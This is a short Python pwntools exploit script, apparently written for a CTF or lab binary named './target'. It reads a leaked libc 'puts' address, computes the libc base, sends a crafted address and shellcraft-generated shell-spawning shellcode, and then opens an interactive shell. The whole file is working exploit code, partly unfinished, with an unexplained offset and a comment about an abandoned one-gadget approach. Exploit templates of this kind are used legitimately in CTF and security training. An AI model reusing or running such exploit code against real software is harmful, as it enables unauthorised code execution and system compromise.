#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./target')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --
shellcode = shellcraft.sh()
io = start()
io.recvuntil('0x')
addr = int(io.readline().strip(), 16)
print(hex(addr))
puts_libc = addr
#NOTE: this is new, was going to try the onegagdet trick instead of shellcraft
libc.address = puts_libc - libc.symbols['puts']
print("libc: {}".format(hex(libc.address)))
writethis = addr + 0x77fcb0
print(hex(writethis))
print(len(p64(writethis)))
io.send(p64(writethis))
print("sc size: {}".format(len(asm(shellcode))))
io.send(asm(shellcode))
io.interactive()
